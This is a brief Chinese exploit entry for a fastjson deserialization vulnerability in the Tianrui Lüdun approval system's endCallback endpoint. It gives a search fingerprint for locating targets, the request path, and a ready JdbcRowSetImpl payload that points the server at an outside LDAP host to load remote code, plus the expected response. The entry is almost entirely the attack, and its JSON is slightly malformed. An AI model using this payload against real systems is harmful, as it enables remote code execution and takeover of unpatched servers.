# 天锐绿盾审批系统Callback存在fastjson反序列化漏洞

天锐绿盾 ｜ 反序列化 ｜ —
- **指纹**：`body="location.href=location.href+\"`
- **请求**：`POST /trwfe/ws/taskCommon/endCallback HTTP/1.1`

**Payload**
```
"workflowInstanceId": "any-non-empty-string",
"approval": "true",
"data": [
"@type": "com.sun.rowset.JdbcRowSetImpl",
"dataSourceName": "ldap://192.168.168.11:50389/165c51",
"autoCommit": true
]
}
```
- **响应特征**：200